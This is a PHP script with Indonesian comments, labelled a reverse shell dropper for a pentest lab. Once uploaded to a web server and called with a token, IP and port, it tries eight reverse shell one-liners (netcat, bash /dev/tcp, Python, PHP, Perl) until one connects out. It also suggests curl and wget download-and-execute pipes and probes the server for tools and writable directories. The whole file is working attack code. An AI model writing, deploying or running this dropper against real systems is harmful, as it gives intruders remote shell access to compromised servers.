<?php
// Reverse Shell Dropper untuk Lab Pentest
// Token: PENTEST_LAB_TOKEN_2024

class PentestDropper {
    private $token = 'PENTEST_LAB_TOKEN_2024'; // GANTI DENGAN TOKEN ANDA
    private $timeout = 30;
    private $debug = true; // Set ke false di production
    
    public function __construct() {
        // Set timeout eksekusi
        set_time_limit($this->timeout);
        
        // Enable CORS jika diperlukan
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: GET');
        
        // Mode API - selalu return JSON
        $this->handleRequest();
    }
    
    private function handleRequest() {
        try {
            // Validasi token
            if (!$this->validateToken()) {
                $this->sendResponse([
                    'status' => 'error',
                    'message' => 'Invalid or missing token',
                    'code' => 'INVALID_TOKEN'
                ], 401);
                return;
            }
            
            // Validasi parameter
            if (!$this->validateParams()) {
                $this->sendResponse([
                    'status' => 'error',
                    'message' => 'Missing or invalid IP/Port parameters',
                    'code' => 'INVALID_PARAMS',
                    'required_params' => ['token', 'ip', 'port'],
                    'received' => $_GET
                ], 400);
                return;
            }
            
            // Eksekusi reverse shell
            $result = $this->executeReverseShell();
            $this->sendResponse($result);
            
        } catch (Exception $e) {
            $this->sendResponse([
                'status' => 'error',
                'message' => 'Internal server error: ' . $e->getMessage(),
                'code' => 'INTERNAL_ERROR'
            ], 500);
        }
    }
    
    private function validateToken() {
        if (!isset($_GET['token']) || empty($_GET['token'])) {
            return false;
        }
        
        // Token harus sama dengan yang dikonfigurasi
        $received_token = $_GET['token'];
        $expected_token = $this->token;
        
        // Gunakan hash_equals untuk prevent timing attack
        if (function_exists('hash_equals')) {
            return hash_equals($expected_token, $received_token);
        }
        
        // Fallback untuk PHP < 5.6
        return $expected_token === $received_token;
    }
    
    private function validateParams() {
        if (!isset($_GET['ip']) || !isset($_GET['port'])) {
            return false;
        }
        
        $ip = $_GET['ip'];
        $port = $_GET['port'];
        
        // Validasi IP
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            // Coba cek jika IP adalah hostname
            if (!filter_var(gethostbyname($ip), FILTER_VALIDATE_IP)) {
                return false;
            }
        }
        
        // Validasi port
        if (!is_numeric($port) || $port < 1 || $port > 65535) {
            return false;
        }
        
        return true;
    }
    
    private function sendResponse($data, $http_code = 200) {
        http_response_code($http_code);
        header('Content-Type: application/json; charset=utf-8');
        
        // Tambahkan debug info jika diperlukan
        if ($this->debug) {
            $data['debug'] = [
                'timestamp' => date('Y-m-d H:i:s'),
                'server_time' => time(),
                'php_version' => PHP_VERSION,
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown'
            ];
        }
        
        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
    
    private function executeReverseShell() {
        $ip = $_GET['ip'];
        $port = (int)$_GET['port'];
        
        // Log aktivitas
        $this->logActivity($ip, $port);
        
        // Check capabilities
        $capabilities = $this->checkCapabilities();
        
        // Cek jika exec di-disable
        if (!$capabilities['exec_enabled']) {
            return [
                'status' => 'partial',
                'message' => 'exec() function is disabled or restricted',
                'capabilities' => $capabilities,
                'suggestions' => $this->getAlternativeMethods($ip, $port),
                'test_commands' => $this->getTestCommands($ip, $port)
            ];
        }
        
        // Coba metode reverse shell
        $methods = $this->getReverseShellMethods($ip, $port);
        $executed_methods = [];
        
        foreach ($methods as $method_name => $command) {
            $result = $this->tryExecuteCommand($command);
            $executed_methods[$method_name] = $result;
            
            if ($result['success']) {
                // Cek jika proses berjalan
                if ($this->checkProcessRunning($ip, $port)) {
                    return [
                        'status' => 'success',
                        'message' => 'Reverse shell executed successfully',
                        'method_used' => $method_name,
                        'command_executed' => $command,
                        'execution_result' => $result,
                        'capabilities' => $capabilities,
                        'check_connection' => "nc -zv $ip $port"
                    ];
                }
            }
            
            // Tunggu sebentar sebelum mencoba metode lain
            usleep(100000); // 0.1 detik
        }
        
        // Jika semua metode gagal
        return [
            'status' => 'failed',
            'message' => 'All reverse shell methods failed to establish connection',
            'capabilities' => $capabilities,
            'executed_methods' => $executed_methods,
            'test_connection' => $this->getTestCommands($ip, $port),
            'next_steps' => [
                'Check if port ' . $port . ' is open on listener',
                'Verify IP ' . $ip . ' is reachable from target',
                'Check firewall rules'
            ]
        ];
    }
    
    private function checkCapabilities() {
        $capabilities = [
            'php_functions' => [
                'exec' => function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))),
                'shell_exec' => function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions'))),
                'system' => function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions'))),
                'passthru' => function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions'))),
                'proc_open' => function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions'))),
                'popen' => function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))
            ],
            'network_tools' => [],
            'system_info' => [
                'os' => PHP_OS,
                'php_version' => PHP_VERSION,
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'user' => function_exists('get_current_user') ? get_current_user() : 'Unknown'
            ]
        ];
        
        // Check netcat variants
        $nc_variants = ['nc', 'ncat', 'netcat', 'nc.traditional'];
        foreach ($nc_variants as $nc) {
            $output = [];
            exec("which $nc 2>/dev/null", $output, $return);
            $capabilities['network_tools'][$nc] = ($return === 0);
            
            if ($return === 0 && !empty($output)) {
                exec("$nc --version 2>&1 | head -1", $version, $v_return);
                $capabilities['network_tools'][$nc . '_version'] = $v_return === 0 ? implode(' ', $version) : 'Available';
            }
        }
        
        // Check other tools
        $tools = ['bash', 'sh', 'python', 'python3', 'perl', 'php', 'socat', 'curl', 'wget', 'telnet'];
        foreach ($tools as $tool) {
            exec("which $tool 2>/dev/null", $output, $return);
            $capabilities['network_tools'][$tool] = ($return === 0);
        }
        
        // Check writable directories
        $writable_dirs = [];
        $dirs_to_check = ['/tmp', '/var/tmp', '/dev/shm', '/tmp/php*', '.'];
        foreach ($dirs_to_check as $dir) {
            if (@is_writable($dir)) {
                $writable_dirs[] = $dir;
            }
        }
        $capabilities['writable_dirs'] = $writable_dirs;
        
        return $capabilities;
    }
    
    private function getReverseShellMethods($ip, $port) {
        $methods = [];
        
        // Method 1: Original netcat with mkfifo
        $methods['nc_mkfifo'] = "rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/bash -i 2>&1 | nc $ip $port > /tmp/p";
        
        // Method 2: Netcat with -e (jika tersedia)
        $methods['nc_e'] = "nc -e /bin/bash $ip $port";
        
        // Method 3: Bash TCP (jika /dev/tcp supported)
        $methods['bash_tcp'] = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        
        // Method 4: Python
        $methods['python'] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
        
        // Method 5: Python 3
        $methods['python3'] = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
        
        // Method 6: PHP
        $methods['php'] = "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        
        // Method 7: Simple netcat (backup)
        $methods['nc_simple'] = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ip $port > /tmp/f";
        
        // Method 8: Perl
        $methods['perl'] = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
        
        return $methods;
    }
    
    private function tryExecuteCommand($command) {
        $output = [];
        $return_var = 0;
        
        // Execute command in background
        $full_command = $command . " > /dev/null 2>&1 & echo \$!";
        
        @exec($full_command, $output, $return_var);
        
        $pid = !empty($output) ? intval($output[0]) : 0;
        
        // Tunggu sebentar untuk melihat jika proses masih berjalan
        usleep(50000); // 50ms
        
        $is_running = false;
        if ($pid > 0) {
            @exec("ps -p $pid 2>/dev/null", $process_check, $ps_return);
            $is_running = ($ps_return === 0);
        }
        
        return [
            'success' => ($return_var === 0),
            'pid' => $pid,
            'process_running' => $is_running,
            'return_code' => $return_var,
            'output' => $output,
            'timestamp' => microtime(true)
        ];
    }
    
    private function checkProcessRunning($ip, $port) {
        // Cek proses yang terkait dengan IP dan port
        $commands = [
            "ps aux | grep -v grep | grep -E 'nc.*$ip.*$port'",
            "ps aux | grep -v grep | grep -E 'bash.*$ip.*$port'",
            "ps aux | grep -v grep | grep -E 'python.*$ip.*$port'",
            "netstat -tunap 2>/dev/null | grep '$ip:$port'",
            "ss -tunap 2>/dev/null | grep '$ip:$port'"
        ];
        
        foreach ($commands as $cmd) {
            $output = [];
            @exec($cmd, $output, $return);
            if (!empty($output)) {
                return true;
            }
        }
        
        return false;
    }
    
    private function getAlternativeMethods($ip, $port) {
        return [
            'curl_download_execute' => "curl -s http://$ip:$port/shell.sh | bash",
            'wget_download_execute' => "wget -qO- http://$ip:$port/shell.sh | bash",
            'php_direct_socket' => "php -r '\$s=fsockopen(\"$ip\",$port);system(\"bash -i <&3 >&3 2>&3\");'",
            'perl_direct' => "perl -MIO -e '\$p=fork;exit,if(\$p);foreach my \$key(keys \%ENV){if(\$ENV{\$key}=~/(.*)/){\$ENV{\$key}=$1;}}\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);STDOUT->fdopen(\$c,w);STDERR->fdopen(\$c,w);system(\$_);'"
        ];
    }
    
    private function getTestCommands($ip, $port) {
        return [
            'test_tcp_connection' => "timeout 2 bash -c 'cat < /dev/null > /dev/tcp/$ip/$port' && echo 'TCP OK' || echo 'TCP FAILED'",
            'test_netcat' => "nc -zv $ip $port 2>&1",
            'test_http' => "curl -s --connect-timeout 3 http://$ip:$port/ || wget --timeout=3 -qO- http://$ip:$port/",
            'ping_test' => "ping -c 2 -W 1 $ip 2>/dev/null | grep 'packets transmitted'"
        ];
    }
    
    private function logActivity($ip, $port) {
        $log_data = [
            'time' => date('Y-m-d H:i:s'),
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'target_ip' => $ip,
            'target_port' => $port,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'script' => basename(__FILE__),
            'query_string' => $_SERVER['QUERY_STRING'] ?? ''
        ];
        
        $log_file = dirname(__FILE__) . '/pentest_dropper.log';
        $log_entry = json_encode($log_data, JSON_UNESCAPED_SLASHES) . PHP_EOL;
        
        @file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    }
}

// Handle preflight untuk CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    exit(0);
}

// Eksekusi dropper
new PentestDropper();
?>
